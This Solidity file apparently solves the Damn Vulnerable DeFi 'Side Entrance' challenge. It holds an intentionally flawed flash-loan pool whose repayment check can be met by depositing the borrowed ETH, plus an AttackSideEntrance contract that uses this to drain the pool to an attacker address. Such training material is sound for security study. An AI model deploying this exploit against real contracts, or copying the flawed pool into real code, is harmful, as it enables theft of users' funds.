// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        /**
         * Check should be here
         * b1 = balances[msg.sender];
         */
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
        /** 
         * b2 = balances[msg.sender];
         * require(b2 <= b1)
         */

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
}


contract AttackSideEntrance {
    SideEntranceLenderPool victim;
    address attacker;

    constructor(SideEntranceLenderPool _victim, address _attacker) {
        victim = _victim;
        attacker = _attacker;
    }

    // Calling flashLoan function => It would call execute => it would call deposit
    function attack(uint256 _amount) external {
        victim.flashLoan(_amount);
        victim.withdraw();
        payable(attacker).transfer(address(this).balance);
    }

    function execute() external payable {
        victim.deposit{value: msg.value}();
    }

    // To reveive when withdrwa is called
    receive() external payable {}
}
 